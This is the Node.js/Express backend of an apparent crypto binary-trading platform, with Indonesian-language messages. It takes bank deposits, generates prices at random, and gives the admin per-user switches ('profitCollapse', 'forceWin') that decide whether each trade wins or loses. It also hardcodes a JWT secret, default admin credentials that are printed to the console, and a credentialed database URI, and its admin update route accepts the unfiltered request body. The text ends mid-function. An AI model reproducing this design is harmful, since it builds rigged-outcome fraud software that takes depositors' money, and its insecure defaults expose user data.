const express = require('express');
const mongoose = require('mongoose');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const http = require('http');
const socketIo = require('socket.io');
const compression = require('compression');
const morgan = require('morgan');

// ====================================
// 🔧 KONFIGURASI DASAR - DIPERBAIKI
// ====================================
const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST", "PUT", "DELETE", "PATCH"]
    }
});

const PORT = process.env.PORT || 5000;
const JWT_SECRET = process.env.JWT_SECRET || 'tradestation_super_secret_key_2024_very_secure';

// 🔧 MONGODB CONNECTION - DIPERBAIKI
// Gunakan MongoDB lokal atau connection string yang valid
const MONGODB_URI = process.env.MONGODB_URI || 
    'mongodb://localhost:27017/tradestation' || // Local MongoDB
    'mongodb+srv://admin:admin123@cluster0.mongodb.net/tradestation?retryWrites=true&w=majority'; // Atlas fallback

console.log('🔄 Connecting to MongoDB:', MONGODB_URI.includes('localhost') ? 'Local MongoDB' : 'MongoDB Atlas');

// ====================================
// MIDDLEWARE SETUP
// ====================================
app.use(helmet({
    contentSecurityPolicy: false,
    crossOriginEmbedderPolicy: false
}));
app.use(compression());
app.use(morgan('combined'));
app.use(cors({
    origin: '*',
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Rate limiting
const authLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 10, // limit each IP to 10 requests per windowMs
    message: { error: 'Terlalu banyak percobaan login. Silakan tunggu 15 menit.' },
    standardHeaders: true,
    legacyHeaders: false,
});

const generalLimiter = rateLimit({
    windowMs: 1 * 60 * 1000, // 1 minute
    max: 100, // limit each IP to 100 requests per windowMs
    standardHeaders: true,
    legacyHeaders: false,
});

app.use('/api/login', authLimiter);
app.use('/api/register', authLimiter);
app.use('/api', generalLimiter);

// ====================================
// FILE UPLOAD SETUP
// ====================================
const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        const uploadDir = 'uploads/';
        if (!fs.existsSync(uploadDir)) {
            fs.mkdirSync(uploadDir, { recursive: true });
        }
        cb(null, uploadDir);
    },
    filename: function (req, file, cb) {
        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
        cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
    }
});

const upload = multer({
    storage: storage,
    limits: {
        fileSize: 5 * 1024 * 1024 // 5MB limit
    },
    fileFilter: function (req, file, cb) {
        const allowedTypes = /jpeg|jpg|png|gif|webp/;
        const extname = allowedTypes.test(path.extname(file.originalname).toLowerCase());
        const mimetype = allowedTypes.test(file.mimetype);
        
        if (mimetype && extname) {
            return cb(null, true);
        } else {
            cb(new Error('File harus berformat gambar (JPEG, PNG, GIF, WebP)'));
        }
    }
});

// ====================================
// 🔧 DATABASE SCHEMAS - DIPERBAIKI
// ====================================
const userSchema = new mongoose.Schema({
    name: { type: String, required: true, trim: true },
    email: { 
        type: String, 
        sparse: true, 
        lowercase: true, 
        trim: true,
        validate: {
            validator: function(v) {
                // Email harus valid jika disediakan
                if (!v) return true; // Allow empty
                return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);
            },
            message: 'Email tidak valid'
        }
    },
    phone: { 
        type: String, 
        sparse: true, 
        trim: true,
        validate: {
            validator: function(v) {
                // Phone harus valid jika disediakan
                if (!v) return true; // Allow empty
                return /^[\+]?[\d\s\-\(\)]{10,15}$/.test(v);
            },
            message: 'Nomor HP tidak valid'
        }
    },
    password: { type: String, required: true },
    balance: { type: Number, default: 0 },
    totalProfit: { type: Number, default: 0 },
    totalLoss: { type: Number, default: 0 },
    accountType: { type: String, enum: ['standard', 'premium'], default: 'standard' },
    isActive: { type: Boolean, default: true },
    bankData: {
        bankName: String,
        accountNumber: String,
        accountHolder: String
    },
    adminSettings: {
        profitCollapse: { type: String, enum: ['normal', 'profit', 'collapse'], default: 'normal' },
        profitPercentage: { type: Number, default: 80, min: 20, max: 100 },
        forceWin: { type: Boolean, default: false },
        forceWinRate: { type: Number, default: 0, min: 0, max: 100 }
    },
    stats: {
        totalTrades: { type: Number, default: 0 },
        winTrades: { type: Number, default: 0 },
        loseTrades: { type: Number, default: 0 }
    }
}, {
    timestamps: true,
    toJSON: { 
        transform: function(doc, ret) {
            delete ret.password;
            return ret;
        }
    }
});

// Custom validation - setidaknya email atau phone harus ada
userSchema.pre('save', function(next) {
    if (!this.email && !this.phone) {
        return next(new Error('Email atau nomor HP harus diisi'));
    }
    next();
});

const tradeSchema = new mongoose.Schema({
    userId: { type: mongoose.Schema.Types.ObjectId, ref: 'User', required: true },
    symbol: { type: String, required: true },
    direction: { type: String, enum: ['buy', 'sell'], required: true },
    amount: { type: Number, required: true },
    duration: { type: Number, required: true },
    entryPrice: { type: Number, required: true },
    exitPrice: { type: Number },
    status: { type: String, enum: ['active', 'completed'], default: 'active' },
    result: { type: String, enum: ['win', 'lose'] },
    payout: { type: Number },
    priceChangePercent: { type: Number },
    forceResult: { type: String, enum: ['win', 'lose'] },
    adminForced: { type: Boolean, default: false },
    completedAt: { type: Date }
}, { timestamps: true });

const depositSchema = new mongoose.Schema({
    userId: { type: mongoose.Schema.Types.ObjectId, ref: 'User', required: true },
    amount: { type: Number, required: true },
    status: { type: String, enum: ['pending', 'approved', 'rejected'], default: 'pending' },
    receipt: { type: String }, // File path
    fileName: { type: String },
    method: { type: String, default: 'Bank Transfer' },
    bankFrom: { type: String },
    adminNotes: { type: String },
    processedAt: { type: Date },
    processedBy: { type: mongoose.Schema.Types.ObjectId, ref: 'User' }
}, { timestamps: true });

const withdrawalSchema = new mongoose.Schema({
    userId: { type: mongoose.Schema.Types.ObjectId, ref: 'User', required: true },
    amount: { type: Number, required: true },
    fee: { type: Number, required: true },
    finalAmount: { type: Number, required: true },
    status: { type: String, enum: ['pending', 'approved', 'rejected', 'processed'], default: 'pending' },
    bankAccount: {
        bankName: { type: String, required: true },
        accountNumber: { type: String, required: true },
        accountHolder: { type: String, required: true }
    },
    adminNotes: { type: String },
    processedAt: { type: Date },
    processedBy: { type: mongoose.Schema.Types.ObjectId, ref: 'User' }
}, { timestamps: true });

const bankAccountSchema = new mongoose.Schema({
    bankName: { type: String, required: true },
    accountNumber: { type: String, required: true },
    accountHolder: { type: String, required: true },
    note: { type: String },
    isActive: { type: Boolean, default: true }
}, { timestamps: true });

const activitySchema = new mongoose.Schema({
    userId: { type: mongoose.Schema.Types.ObjectId, ref: 'User' },
    action: { type: String, required: true },
    details: { type: String, required: true },
    ipAddress: { type: String },
    userAgent: { type: String }
}, { timestamps: true });

// Create indexes - IMPROVED
userSchema.index({ email: 1 }, { unique: true, sparse: true });
userSchema.index({ phone: 1 }, { unique: true, sparse: true });
tradeSchema.index({ userId: 1, createdAt: -1 });
depositSchema.index({ userId: 1, status: 1, createdAt: -1 });
withdrawalSchema.index({ userId: 1, status: 1, createdAt: -1 });

// Models
const User = mongoose.model('User', userSchema);
const Trade = mongoose.model('Trade', tradeSchema);
const Deposit = mongoose.model('Deposit', depositSchema);
const Withdrawal = mongoose.model('Withdrawal', withdrawalSchema);
const BankAccount = mongoose.model('BankAccount', bankAccountSchema);
const Activity = mongoose.model('Activity', activitySchema);

// ====================================
// 🔧 DATABASE CONNECTION - DIPERBAIKI
// ====================================
async function connectDB() {
    try {
        // Improved connection options
        const connectionOptions = {
            useNewUrlParser: true,
            useUnifiedTopology: true,
            maxPoolSize: 10, // Maintain up to 10 socket connections
            serverSelectionTimeoutMS: 5000, // Keep trying to send operations for 5 seconds
            socketTimeoutMS: 45000, // Close sockets after 45 seconds of inactivity
            bufferMaxEntries: 0, // Disable mongoose buffering
            bufferCommands: false, // Disable mongoose buffering
        };

        console.log('🔄 Attempting MongoDB connection...');
        await mongoose.connect(MONGODB_URI, connectionOptions);
        console.log('✅ MongoDB connected successfully');
        
        // Test the connection
        const testResult = await mongoose.connection.db.admin().ping();
        if (testResult.ok === 1) {
            console.log('✅ MongoDB ping test successful');
        }
        
        // Create default admin user
        await createDefaultAdmin();
        
        // Create default bank accounts
        await createDefaultBankAccounts();
        
    } catch (error) {
        console.error('❌ MongoDB connection failed:', error.message);
        console.log('🔄 Retrying connection in 5 seconds...');
        
        // Retry connection after 5 seconds
        setTimeout(connectDB, 5000);
    }
}

// Handle MongoDB connection events
mongoose.connection.on('connected', () => {
    console.log('✅ Mongoose connected to MongoDB');
});

mongoose.connection.on('error', (err) => {
    console.error('❌ Mongoose connection error:', err.message);
});

mongoose.connection.on('disconnected', () => {
    console.log('❌ Mongoose disconnected');
});

async function createDefaultAdmin() {
    try {
        const adminExists = await User.findOne({ email: 'admin@tradestation.com' });
        if (!adminExists) {
            const hashedPassword = await bcrypt.hash('admin123456', 12);
            const admin = new User({
                name: 'Administrator',
                email: 'admin@tradestation.com',
                password: hashedPassword,
                accountType: 'premium',
                balance: 0
            });
            await admin.save();
            console.log('✅ Default admin user created');
            console.log('📧 Admin login: admin@tradestation.com');
            console.log('🔑 Admin password: admin123456');
        } else {
            console.log('✅ Admin user already exists');
        }
    } catch (error) {
        console.error('❌ Error creating admin user:', error.message);
    }
}

async function createDefaultBankAccounts() {
    try {
        const bankCount = await BankAccount.countDocuments();
        if (bankCount === 0) {
            const defaultBanks = [
                {
                    bankName: 'Bank BCA',
                    accountNumber: '1234567890',
                    accountHolder: 'TradeStation Official',
                    note: 'Primary deposit account',
                    isActive: true
                },
                {
                    bankName: 'Bank Mandiri',
                    accountNumber: '9876543210',
                    accountHolder: 'TradeStation Official',
                    note: 'Secondary deposit account',
                    isActive: true
                }
            ];
            
            await BankAccount.insertMany(defaultBanks);
            console.log('✅ Default bank accounts created');
        }
    } catch (error) {
        console.error('❌ Error creating bank accounts:', error.message);
    }
}

// ====================================
// MIDDLEWARE FUNCTIONS
// ====================================
const authenticateToken = async (req, res, next) => {
    try {
        const authHeader = req.headers['authorization'];
        const token = authHeader && authHeader.split(' ')[1];

        if (!token) {
            return res.status(401).json({ error: 'Token akses diperlukan' });
        }

        const decoded = jwt.verify(token, JWT_SECRET);
        const user = await User.findById(decoded.userId);
        
        if (!user) {
            return res.status(401).json({ error: 'Token tidak valid' });
        }

        req.user = user;
        next();
    } catch (error) {
        console.error('❌ Auth error:', error.message);
        return res.status(401).json({ error: 'Token tidak valid' });
    }
};

const requireAdmin = async (req, res, next) => {
    try {
        if (req.user.email !== 'admin@tradestation.com') {
            return res.status(403).json({ error: 'Akses admin diperlukan' });
        }
        next();
    } catch (error) {
        console.error('❌ Admin auth error:', error.message);
        return res.status(403).json({ error: 'Akses admin diperlukan' });
    }
};

const logActivity = async (userId, action, details, req) => {
    try {
        const activity = new Activity({
            userId: userId,
            action: action,
            details: details,
            ipAddress: req.ip || req.connection.remoteAddress,
            userAgent: req.get('User-Agent')
        });
        await activity.save();
    } catch (error) {
        console.error('❌ Error logging activity:', error.message);
    }
};

// ====================================
// CRYPTO PRICE SIMULATION
// ====================================
let cryptoPrices = {
    BTC: { price: 45000, change: 2.45 },
    ETH: { price: 3200, change: -1.23 },
    LTC: { price: 180, change: 0.87 },
    XRP: { price: 0.65, change: 3.21 },
    DOGE: { price: 0.08, change: -2.15 },
    TRX: { price: 0.12, change: 1.45 }
};

function updateCryptoPrices() {
    Object.keys(cryptoPrices).forEach(symbol => {
        const volatility = 0.005; // 0.5% volatility
        const priceChange = (Math.random() - 0.5) * volatility;
        cryptoPrices[symbol].price *= (1 + priceChange);
        cryptoPrices[symbol].change = (Math.random() - 0.5) * 10;
    });
    
    // Broadcast to all connected clients
    io.emit('priceUpdate', cryptoPrices);
}

// Update prices every 5 seconds
setInterval(updateCryptoPrices, 5000);

// ====================================
// BASIC ROUTES
// ====================================

// Health check - IMPROVED
app.get('/api/health', async (req, res) => {
    try {
        // Test database connection
        const dbStatus = mongoose.connection.readyState === 1 ? 'connected' : 'disconnected';
        
        res.json({ 
            status: 'OK', 
            timestamp: new Date().toISOString(),
            uptime: process.uptime(),
            environment: process.env.NODE_ENV || 'development',
            database: {
                status: dbStatus,
                host: mongoose.connection.host,
                name: mongoose.connection.name
            }
        });
    } catch (error) {
        res.status(500).json({
            status: 'ERROR',
            error: error.message
        });
    }
});

// Serve uploaded files
app.use('/uploads', express.static('uploads'));

// ====================================
// 🔧 AUTHENTICATION ROUTES - DIPERBAIKI
// ====================================

// Utility function untuk validasi email dan phone
function validateContact(contact) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const phoneRegex = /^[\+]?[\d\s\-\(\)]{10,15}$/;
    
    // Clean phone number (remove spaces, dashes, parentheses)
    const cleanPhone = contact.replace(/[\s\-\(\)]/g, '');
    
    const isEmail = emailRegex.test(contact);
    const isPhone = phoneRegex.test(contact) && cleanPhone.length >= 10;
    
    return { isEmail, isPhone, cleanPhone };
}

// Register - FIXED
app.post('/api/register', async (req, res) => {
    try {
        const { name, email, phone, password } = req.body;

        console.log('📝 Registration attempt:', { name, email, phone, hasPassword: !!password });

        // Validation
        if (!name || name.length < 2) {
            return res.status(400).json({ error: 'Nama harus minimal 2 karakter' });
        }

        if (!password || password.length < 6) {
            return res.status(400).json({ error: 'Password minimal 6 karakter' });
        }

        // Check if we have either email or phone
        let finalEmail = null;
        let finalPhone = null;

        if (email) {
            const { isEmail } = validateContact(email);
            if (!isEmail) {
                return res.status(400).json({ error: 'Format email tidak valid' });
            }
            finalEmail = email.toLowerCase().trim();
        }

        if (phone) {
            const { isPhone, cleanPhone } = validateContact(phone);
            if (!isPhone) {
                return res.status(400).json({ error: 'Format nomor HP tidak valid' });
            }
            
            // Standardize phone format
            let standardPhone = cleanPhone;
            if (standardPhone.startsWith('08')) {
                standardPhone = '+62' + standardPhone.substring(1);
            } else if (standardPhone.startsWith('62') && !standardPhone.startsWith('+')) {
                standardPhone = '+' + standardPhone;
            }
            finalPhone = standardPhone;
        }

        // Must have at least email or phone
        if (!finalEmail && !finalPhone) {
            return res.status(400).json({ error: 'Email atau nomor HP harus diisi' });
        }

        // Check if user exists
        const existingQuery = [];
        if (finalEmail) existingQuery.push({ email: finalEmail });
        if (finalPhone) existingQuery.push({ phone: finalPhone });

        const existingUser = await User.findOne({ $or: existingQuery });

        if (existingUser) {
            return res.status(400).json({ error: 'Email atau nomor HP sudah terdaftar' });
        }

        // Hash password
        const hashedPassword = await bcrypt.hash(password, 12);

        // Create user
        const userData = {
            name: name.trim(),
            password: hashedPassword,
            balance: 0,
            totalProfit: 0,
            totalLoss: 0
        };

        if (finalEmail) userData.email = finalEmail;
        if (finalPhone) userData.phone = finalPhone;

        console.log('💾 Creating user:', { ...userData, password: '[HIDDEN]' });

        const user = new User(userData);
        await user.save();

        // Generate token
        const token = jwt.sign({ userId: user._id }, JWT_SECRET, { expiresIn: '7d' });

        // Log activity
        await logActivity(user._id, 'Registrasi', 'User berhasil registrasi', req);

        console.log('✅ Registration successful for:', user.name);

        const userResponse = user.toJSON();
        res.status(201).json({
            message: 'Registrasi berhasil',
            token,
            user: userResponse
        });

    } catch (error) {
        console.error('❌ Register error:', error.message);
        
        if (error.code === 11000) {
            // Duplicate key error
            const field = error.message.includes('email') ? 'Email' : 'Nomor HP';
            return res.status(400).json({ error: `${field} sudah terdaftar` });
        }
        
        if (error.message.includes('validation')) {
            return res.status(400).json({ error: error.message });
        }
        
        res.status(500).json({ error: 'Terjadi kesalahan server' });
    }
});

// Login - FIXED
app.post('/api/login', async (req, res) => {
    try {
        const { email, phone, password } = req.body;

        console.log('🔐 Login attempt:', { email, phone, hasPassword: !!password });

        if (!password) {
            return res.status(400).json({ error: 'Password harus diisi' });
        }

        if (!email && !phone) {
            return res.status(400).json({ error: 'Email atau nomor HP harus diisi' });
        }

        // Determine what we're searching for
        let searchQuery = [];
        
        if (email) {
            const { isEmail } = validateContact(email);
            if (isEmail) {
                searchQuery.push({ email: email.toLowerCase().trim() });
            }
        }
        
        if (phone) {
            const { isPhone, cleanPhone } = validateContact(phone);
            if (isPhone) {
                // Try multiple phone formats
                let standardPhone = cleanPhone;
                if (standardPhone.startsWith('08')) {
                    standardPhone = '+62' + standardPhone.substring(1);
                } else if (standardPhone.startsWith('62') && !standardPhone.startsWith('+')) {
                    standardPhone = '+' + standardPhone;
                }
                
                searchQuery.push({ phone: standardPhone });
                searchQuery.push({ phone: cleanPhone });
                searchQuery.push({ phone: phone.trim() });
            }
        }

        // If input could be either email or phone, try both
        const inputValue = email || phone;
        const { isEmail, isPhone, cleanPhone } = validateContact(inputValue);
        
        if (isEmail) {
            searchQuery.push({ email: inputValue.toLowerCase().trim() });
        }
        
        if (isPhone) {
            let standardPhone = cleanPhone;
            if (standardPhone.startsWith('08')) {
                standardPhone = '+62' + standardPhone.substring(1);
            } else if (standardPhone.startsWith('62') && !standardPhone.startsWith('+')) {
                standardPhone = '+' + standardPhone;
            }
            
            searchQuery.push({ phone: standardPhone });
            searchQuery.push({ phone: cleanPhone });
            searchQuery.push({ phone: inputValue.trim() });
        }

        console.log('🔍 Search query:', searchQuery);

        const user = await User.findOne({ $or: searchQuery });

        if (!user) {
            console.log('❌ User not found');
            return res.status(400).json({ error: 'Email/nomor HP atau password salah' });
        }

        if (!user.isActive) {
            return res.status(400).json({ error: 'Akun Anda telah dinonaktifkan' });
        }

        // Check password
        const isValidPassword = await bcrypt.compare(password, user.password);
        if (!isValidPassword) {
            console.log('❌ Invalid password for user:', user.name);
            return res.status(400).json({ error: 'Email/nomor HP atau password salah' });
        }

        // Generate token
        const token = jwt.sign({ userId: user._id }, JWT_SECRET, { expiresIn: '7d' });

        // Log activity
        await logActivity(user._id, 'Login', 'User berhasil login', req);

        console.log('✅ Login successful for:', user.name);

        const userResponse = user.toJSON();
        res.json({
            message: 'Login berhasil',
            token,
            user: userResponse
        });

    } catch (error) {
        console.error('❌ Login error:', error.message);
        res.status(500).json({ error: 'Terjadi kesalahan server' });
    }
});

// ====================================
// USER ROUTES
// ====================================

// Get user profile
app.get('/api/profile', authenticateToken, async (req, res) => {
    try {
        const user = await User.findById(req.user._id);
        res.json(user.toJSON());
    } catch (error) {
        console.error('❌ Profile error:', error.message);
        res.status(500).json({ error: 'Gagal memuat profil' });
    }
});

// Update user bank data
app.put('/api/user/bank-data', authenticateToken, async (req, res) => {
    try {
        const { bankName, accountNumber, accountHolder } = req.body;

        if (!bankName || !accountNumber || !accountHolder) {
            return res.status(400).json({ error: 'Semua field bank data harus diisi' });
        }

        const user = await User.findByIdAndUpdate(
            req.user._id,
            {
                bankData: {
                    bankName: bankName.trim(),
                    accountNumber: accountNumber.trim(),
                    accountHolder: accountHolder.trim()
                }
            },
            { new: true }
        );

        await logActivity(req.user._id, 'Update Bank Data', 'User mengupdate data bank', req);

        res.json({
            message: 'Data bank berhasil diupdate',
            bankData: user.bankData
        });
    } catch (error) {
        console.error('❌ Bank data update error:', error.message);
        res.status(500).json({ error: 'Gagal mengupdate data bank' });
    }
});

// Get crypto prices
app.get('/api/prices', authenticateToken, (req, res) => {
    try {
        const prices = Object.keys(cryptoPrices).map(symbol => ({
            symbol,
            ...cryptoPrices[symbol]
        }));
        res.json(prices);
    } catch (error) {
        console.error('❌ Prices error:', error.message);
        res.status(500).json({ error: 'Gagal memuat harga crypto' });
    }
});

// ====================================
// TRADING ROUTES
// ====================================

// Create trade
app.post('/api/trade', authenticateToken, async (req, res) => {
    try {
        const { symbol, direction, amount, duration } = req.body;

        // Validation
        if (!symbol || !direction || !amount || !duration) {
            return res.status(400).json({ error: 'Semua field trade harus diisi' });
        }

        if (amount < 500000 || amount > 100000000) {
            return res.status(400).json({ error: 'Jumlah trading harus antara Rp 500.000 - Rp 100.000.000' });
        }

        if (amount > req.user.balance) {
            return res.status(400).json({ error: 'Saldo tidak mencukupi' });
        }

        // Get current price
        const currentPrice = cryptoPrices[symbol]?.price;
        if (!currentPrice) {
            return res.status(400).json({ error: 'Symbol crypto tidak valid' });
        }

        // Deduct balance
        const newBalance = req.user.balance - amount;
        await User.findByIdAndUpdate(req.user._id, { balance: newBalance });

        // Create trade
        const trade = new Trade({
            userId: req.user._id,
            symbol,
            direction,
            amount,
            duration,
            entryPrice: currentPrice,
            status: 'active'
        });

        await trade.save();

        // Schedule trade completion
        setTimeout(async () => {
            await completeTrade(trade._id);
        }, duration * 1000);

        await logActivity(req.user._id, 'Create Trade', `Trade ${symbol} ${direction} ${amount}`, req);

        res.json({
            message: 'Trade berhasil dibuat',
            trade,
            newBalance
        });

    } catch (error) {
        console.error('❌ Trade creation error:', error.message);
        res.status(500).json({ error: 'Gagal membuat trade' });
    }
});

// Complete trade function
async function completeTrade(tradeId) {
    try {
        const trade = await Trade.findById(tradeId).populate('userId');
        if (!trade || trade.status !== 'active') return;

        const user = trade.userId;
        const currentPrice = cryptoPrices[trade.symbol]?.price || trade.entryPrice;
        
        // Calculate price change
        const priceChangePercent = ((currentPrice - trade.entryPrice) / trade.entryPrice) * 100;
        
        let result = 'lose';
        let payout = 0;
        let adminForced = false;

        // Check admin settings
        const adminSettings = user.adminSettings || {};
        
        if (adminSettings.profitCollapse === 'profit') {
            result = 'win';
            adminForced = true;
        } else if (adminSettings.profitCollapse === 'collapse') {
            result = 'lose';
            adminForced = true;
        } else if (adminSettings.forceWin && Math.random() * 100 < adminSettings.forceWinRate) {
            result = 'win';
            adminForced = true;
        } else {
            // Natural result based on direction and price movement
            if (trade.direction === 'buy' && priceChangePercent > 0) {
                result = 'win';
            } else if (trade.direction === 'sell' && priceChangePercent < 0) {
                result = 'win';
            }
        }

        // Calculate payout
        if (result === 'win') {
            const profitPercentage = adminSettings.profitPercentage || 80;
            payout = trade.amount + (trade.amount * profitPercentage / 100);
        }

        // Update trade
        await Trade.findByIdAndUpdate(tradeId, {
            exitPrice: currentPrice,
            status: 'completed',
            result,
            payout,
            priceChangePercent,
            adminForced,
            completedAt: new Date()
        });

        // Update user balance and stats
        const updateData = {
            $inc: {
                'stats.totalTrades': 1
            }
        };

        if (result === 'win') {
            updateData.$inc.balance = payout;
            updateData.$inc.totalProfit = payout - trade.amount;
            updateData.$inc['stats.winTrades'] = 1;
        } else {
            updateData.$inc.totalLoss = trade.amount;
            updateData.$inc['stats.loseTrades'] = 1;
        }

        const updatedUser = await User.findByIdAndUpdate(user._id, updateData, { new: true });

        // Emit to user
        io.to(user._id.toString()).emit('tradeCompleted', {
            trade: { ...trade.toObject(), result, payout, exitPrice: currentPrice },
            newBalance: updatedUser.balance
        });

        console.log(`✅ Trade completed: ${trade.symbol} ${result} - User: ${user.name}`);

    } catch (error) {
        console.error('❌ Complete trade error:', error.message);
    }
}

// Get active trades
app.get('/api/trades/active', authenticateToken, async (req, res) => {
    try {
        const trades = await Trade.find({
            userId: req.user._id,
            status: 'active'
        }).sort({ createdAt: -1 });

        res.json({ trades });
    } catch (error) {
        console.error('❌ Active trades error:', error.message);
        res.status(500).json({ error: 'Gagal memuat trade aktif' });
    }
});

// Get recent trades
app.get('/api/trades/recent', authenticateToken, async (req, res) => {
    try {
        const trades = await Trade.find({
            userId: req.user._id,
            status: 'completed'
        }).sort({ completedAt: -1 }).limit(10);

        res.json({ trades });
    } catch (error) {
        console.error('❌ Recent trades error:', error.message);
        res.status(500).json({ error: 'Gagal memuat riwayat trade' });
    }
});

// Get trading history
app.get('/api/trades/history', authenticateToken, async (req, res) => {
    try {
        const page = parseInt(req.query.page) || 1;
        const limit = parseInt(req.query.limit) || 20;
        const skip = (page - 1) * limit;

        const trades = await Trade.find({
            userId: req.user._id
        }).sort({ createdAt: -1 }).skip(skip).limit(limit);

        const total = await Trade.countDocuments({ userId: req.user._id });

        res.json({
            trades,
            pagination: {
                page,
                limit,
                total,
                pages: Math.ceil(total / limit)
            }
        });
    } catch (error) {
        console.error('❌ Trading history error:', error.message);
        res.status(500).json({ error: 'Gagal memuat riwayat trading' });
    }
});

// ====================================
// DEPOSIT ROUTES
// ====================================

// Get bank accounts for deposit
app.get('/api/bank-accounts', authenticateToken, async (req, res) => {
    try {
        const bankAccounts = await BankAccount.find({ isActive: true });
        res.json({ accounts: bankAccounts });
    } catch (error) {
        console.error('❌ Bank accounts error:', error.message);
        res.status(500).json({ error: 'Gagal memuat rekening bank' });
    }
});

// Create deposit
app.post('/api/deposit', authenticateToken, upload.single('receipt'), async (req, res) => {
    try {
        const { amount } = req.body;

        if (!amount || amount < 500000) {
            return res.status(400).json({ error: 'Minimum deposit Rp 500.000' });
        }

        if (!req.file) {
            return res.status(400).json({ error: 'Bukti transfer harus diupload' });
        }

        const deposit = new Deposit({
            userId: req.user._id,
            amount: parseFloat(amount),
            receipt: `/uploads/${req.file.filename}`,
            fileName: req.file.originalname,
            status: 'pending'
        });

        await deposit.save();

        await logActivity(req.user._id, 'Create Deposit', `Deposit request ${amount}`, req);

        res.json({
            message: 'Permohonan deposit berhasil dikirim',
            deposit
        });

    } catch (error) {
        console.error('❌ Deposit error:', error.message);
        res.status(500).json({ error: 'Gagal memproses deposit' });
    }
});

// Get deposit history
app.get('/api/deposits/history', authenticateToken, async (req, res) => {
    try {
        const deposits = await Deposit.find({ userId: req.user._id })
            .sort({ createdAt: -1 })
            .limit(20);

        res.json({ deposits });
    } catch (error) {
        console.error('❌ Deposit history error:', error.message);
        res.status(500).json({ error: 'Gagal memuat riwayat deposit' });
    }
});

// ====================================
// WITHDRAWAL ROUTES
// ====================================

// Create withdrawal
app.post('/api/withdrawal', authenticateToken, async (req, res) => {
    try {
        const { amount } = req.body;

        if (!amount || amount < 100000) {
            return res.status(400).json({ error: 'Minimum penarikan Rp 100.000' });
        }

        // Check user bank data
        if (!req.user.bankData || !req.user.bankData.bankName) {
            return res.status(400).json({ error: 'Silakan lengkapi data bank terlebih dahulu' });
        }

        // Calculate fee (minimum 6500 or 1%)
        const fee = Math.max(6500, amount * 0.01);
        const finalAmount = amount - fee;

        if (amount > req.user.balance) {
            return res.status(400).json({ error: 'Saldo tidak mencukupi' });
        }

        const withdrawal = new Withdrawal({
            userId: req.user._id,
            amount,
            fee,
            finalAmount,
            bankAccount: req.user.bankData,
            status: 'pending'
        });

        await withdrawal.save();

        // Deduct balance
        await User.findByIdAndUpdate(req.user._id, {
            $inc: { balance: -amount }
        });

        await logActivity(req.user._id, 'Create Withdrawal', `Withdrawal request ${amount}`, req);

        res.json({
            message: 'Permohonan penarikan berhasil dikirim',
            withdrawal
        });

    } catch (error) {
        console.error('❌ Withdrawal error:', error.message);
        res.status(500).json({ error: 'Gagal memproses penarikan' });
    }
});

// Get withdrawal history
app.get('/api/withdrawals/history', authenticateToken, async (req, res) => {
    try {
        const withdrawals = await Withdrawal.find({ userId: req.user._id })
            .sort({ createdAt: -1 })
            .limit(20);

        res.json({ withdrawals });
    } catch (error) {
        console.error('❌ Withdrawal history error:', error.message);
        res.status(500).json({ error: 'Gagal memuat riwayat penarikan' });
    }
});

// ====================================
// ADMIN ROUTES
// ====================================

// Admin Dashboard
app.get('/api/admin/dashboard', authenticateToken, requireAdmin, async (req, res) => {
    try {
        const [users, trades, deposits, withdrawals, bankAccounts] = await Promise.all([
            User.find({ email: { $ne: 'admin@tradestation.com' } }),
            Trade.find(),
            Deposit.find(),
            Withdrawal.find(),
            BankAccount.find()
        ]);

        // Calculate stats
        const stats = {
            users: {
                total: users.length,
                active: users.filter(u => u.isActive).length
            },
            trades: {
                total: trades.length,
                active: trades.filter(t => t.status === 'active').length
            },
            deposits: {
                total: deposits.length,
                pending: deposits.filter(d => d.status === 'pending').length
            },
            withdrawals: {
                total: withdrawals.length,
                pending: withdrawals.filter(w => w.status === 'pending').length
            },
            volume: {
                total: trades.reduce((sum, t) => sum + t.amount, 0),
                today: trades.filter(t => t.createdAt > new Date(Date.now() - 24*60*60*1000))
                    .reduce((sum, t) => sum + t.amount, 0)
            },
            bankAccounts: {
                total: bankAccounts.length,
                active: bankAccounts.filter(b => b.isActive).length
            }
        };

        // Recent activities
        const recentActivities = await Activity.find()
            .populate('userId', 'name email phone')
            .sort({ createdAt: -1 })
            .limit(10);

        res.json({ stats, recentActivities });
    } catch (error) {
        console.error('❌ Admin dashboard error:', error.message);
        res.status(500).json({ error: 'Gagal memuat dashboard' });
    }
});

// Admin - Get all users
app.get('/api/admin/users', authenticateToken, requireAdmin, async (req, res) => {
    try {
        const users = await User.find({ 
            email: { $ne: 'admin@tradestation.com' } 
        }).sort({ createdAt: -1 });

        res.json({ users });
    } catch (error) {
        console.error('❌ Admin users error:', error.message);
        res.status(500).json({ error: 'Gagal memuat daftar user' });
    }
});

// Admin - Update user
app.put('/api/admin/user/:userId', authenticateToken, requireAdmin, async (req, res) => {
    try {
        const { userId } = req.params;
        const updateData = req.body;

        // Don't allow updating admin
        const targetUser = await User.findById(userId);
        if (targetUser.email === 'admin@tradestation.com') {
            return res.status(403).json({ error: 'Cannot update admin user' });
        }

        const user = await User.findByIdAndUpdate(userId, updateData, { new: true });

        await logActivity(req.user._id, 'Update User', `Updated user ${user.name}`, req);

        res.json({ message: 'User berhasil diupdate', user });
    } catch (error) {
        console.error('❌ Admin update user error:', error.message);
        res.status(500).json({ error: 'Gagal mengupdate user' });
    }
});

// Admin - Change user password
app.put('/api/admin/user/:userId/password', authenticateToken, requireAdmin, async (req, res) => {
    try {
        const { userId } = req.params;
        const { newPassword } = req.body;

        if (!newPassword || newPassword.length < 6) {
            return res.status(400).json({ error: 'Password minimal 6 karakter' });
        }

        const hashedPassword = await bcrypt.hash(newPassword, 12);
